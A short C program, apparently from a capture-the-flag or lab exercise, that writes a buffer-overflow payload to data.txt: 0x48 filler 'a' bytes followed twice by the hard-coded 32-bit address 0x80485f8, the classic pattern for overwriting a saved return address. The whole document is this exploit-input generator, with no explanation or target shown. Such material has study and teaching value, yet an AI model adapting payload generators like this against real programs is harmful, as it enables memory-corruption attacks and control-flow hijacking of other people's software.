#include <stdio.h>

int main (int argc, const char * argv[]) {
	int i;
	FILE * fp = fopen("data.txt", "w");
	void * ptr = (void *)0x80485f8;
	const char * ptrData = (const char *)&ptr;
	for (i = 0; i < 0x48; i++) {
		fprintf(fp, "a");
	}
	fwrite(ptrData, 4, 1, fp);
	fwrite(ptrData, 4, 1, fp);
	fclose(fp);
	return 0;
}
